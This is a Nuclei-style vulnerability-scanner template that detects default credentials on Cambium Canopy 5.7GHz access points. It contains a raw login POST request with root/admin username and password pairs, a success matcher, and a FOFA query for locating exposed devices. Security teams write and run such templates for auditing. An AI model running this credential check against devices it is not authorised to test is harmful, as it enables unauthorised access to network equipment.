id: cambium-networks-default-login

info:
  name: Canopy 5.7GHz Access Point Default Credentials
  author: defektive
  severity: high
  description: Canopy 5.7GHz Access Point default login credentials were discovered.
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Welcome to Canopy"})
    verified: true
    max-request: 2
    fofa-query: "title=\"Welcome to Canopy\""
  tags: default-login,cambium,canopy,vuln

http:
  - raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        &Session=0&CanopyUsername={{username}}&CanopyPassword={{password}}&login=Login&webguisubmit=submit

    attack: pitchfork
    payloads:
      username:
        - root
        - admin
      password:
        - root
        - admin
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - Logged in as root

      - type: status
        status:
          - 200

